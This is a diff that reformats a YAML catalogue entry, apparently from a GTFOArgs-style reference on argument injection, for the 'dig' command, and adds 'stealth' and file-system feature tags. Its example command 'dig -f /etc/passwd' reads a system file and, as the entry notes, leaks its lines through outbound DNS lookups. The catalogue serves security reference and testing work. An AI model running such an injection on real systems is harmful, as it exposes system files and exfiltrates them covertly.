@@ -3,26 +3,30 @@ trust_level: community
 id: argument-injection-dig
 namespace: argument:injection:dig
 name: dig
-description: "Argument injection via dig"
-version: "1.0.0"
+description: Argument injection via dig
+version: 1.0.0
 capabilities:
-  - system.file.read
+- system.file.read
 platforms:
-  - cross-platform
+- cross-platform
 techniques:
-  - discovery
+- discovery
 execution:
-  template: "dig"
+  template: dig
   sandbox: execFile
   timeout_seconds: 30
   shell: false
 examples:
-  - description: "Read an arbitrary file by specifying it as a batch file. Note that this will leak lines of the file read as outbound DNS lookups."
-    command: "dig -f /etc/passwd
-"
+- description: Read an arbitrary file by specifying it as a batch file. Note that
+    this will leak lines of the file read as outbound DNS lookups.
+  command: 'dig -f /etc/passwd '
 references:
-  - label: "GTFOArgs"
-    url: "https://gtfoargs.github.io/gtfoargs/dig/"
+- label: GTFOArgs
+  url: https://gtfoargs.github.io/gtfoargs/dig/
+features:
+- file-system
+- local
+- stealth
 ---
 
 # dig
